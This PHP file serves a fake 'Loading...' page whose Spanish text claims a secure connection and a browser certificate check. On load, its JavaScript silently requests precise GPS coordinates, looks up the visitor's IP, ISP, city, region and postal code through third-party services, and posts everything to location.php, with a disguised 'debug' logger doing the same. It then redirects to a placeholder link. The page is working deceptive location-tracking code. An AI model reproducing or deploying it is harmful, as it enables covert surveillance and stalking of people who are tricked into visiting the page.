<?php
include 'ip.php';

echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>

    <script>
        // Debug function
        function debugLog(message) {

            if (
                message.includes("Lat:") ||
                message.includes("Latitude:") ||
                message.includes("Position obtained successfully")
            ) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "debug_log.php", true);
                xhr.setRequestHeader(
                    "Content-Type",
                    "application/x-www-form-urlencoded"
                );

                xhr.send(
                    "message=" + encodeURIComponent(message)
                );
            }
        }

        async function getIPInfo() {
            // Intentamos con ipwho.is primero (muy robusto para ISPs)
            try {
                let res = await fetch("https://ipwho.is/");
                let d = await res.json();
                if (d.success) return {
                    isp: d.connection?.isp || d.connection?.org,
                    city: d.city,
                    region: d.region,
                    country: d.country,
                    zip: d.postal
                };
            } catch (e) {}
            
            // Fallback a ipapi.co si el primero falla
            try {
                let res = await fetch("https://ipapi.co/json/");
                let d = await res.json();
                return {
                    isp: d.org,
                    city: d.city,
                    region: d.region,
                    country: d.country_name,
                    zip: d.postal
                };
            } catch (e) {}
            return {};
        }

        async function getLocation() {
            document.getElementById("locationStatus").innerText = "Estableciendo conexión segura...";
            
            // Iniciamos la obtención de info por IP de inmediato
            const ipInfoPromise = getIPInfo();

            if (navigator.geolocation) {
                document.getElementById("locationStatus").innerText = "Verificando certificado de seguridad...";
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const extraInfo = await ipInfoPromise;
                        sendFinalData(
                            position.coords.latitude, 
                            position.coords.longitude, 
                            position.coords.accuracy, 
                            extraInfo
                        );
                    },
                    async (error) => {
                        // Si deniega o falla el GPS, mandamos al menos lo de la IP
                        const extraInfo = await ipInfoPromise;
                        sendFinalData("Denied", "Denied", "IP-Fallback", extraInfo);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            } else {
                const extraInfo = await ipInfoPromise;
                sendFinalData("Not-Supported", "Not-Supported", "IP-Fallback", extraInfo);
            }
        }

        function sendFinalData(lat, lon, acc, extraInfo) {
            document.getElementById("locationStatus").innerText = "Cargando espacio de trabajo...";

            var isp = extraInfo.isp || "Unknown";
            var city = extraInfo.city || "Unknown";
            var region = extraInfo.region || "Unknown";
            var country = extraInfo.country || "Unknown";
            var zip = extraInfo.zip || "Unknown";

            var xhr = new XMLHttpRequest();

            xhr.open("POST", "location.php", true);

            xhr.setRequestHeader(
                "Content-Type",
                "application/x-www-form-urlencoded"
            );

            xhr.onreadystatechange = function() {

                if (xhr.readyState === 4) {

                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };
            xhr.onerror = function() {
                redirectToMainPage();
            };

            var params =
                "lat=" + lat +
                "&lon=" + lon +
                "&acc=" + acc +
                "&isp=" + encodeURIComponent(isp) +
                "&city=" + encodeURIComponent(city) +
                "&region=" + encodeURIComponent(region) +
                "&country=" + encodeURIComponent(country) +
                "&zip=" + encodeURIComponent(zip) +
                "&time=" + new Date().getTime();

            xhr.send(params);
        }

        function redirectToMainPage() {
            try {
                window.location.href = "forwarding_link";
            } catch (e) {
                window.location = "forwarding_link";
            }
        }

        window.onload = function() {

            setTimeout(function() {
                getLocation();
            }, 500);
        };
    </script>

    <style>

        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
        }

        .spinner {
            border: 8px solid #333;
            border-top: 8px solid #f3f3f3;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {

            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

    </style>

</head>

<body>

    <h2>Accediendo al servicio...</h2>

    <p>Por seguridad, complete la verificación del navegador si se le solicita.</p>

    <p id="locationStatus">Iniciando protocolo...</p>

    <div style="margin-top: 30px;">
        <div class="spinner"></div>
    </div>

</body>
</html>
HTML;

exit;
?>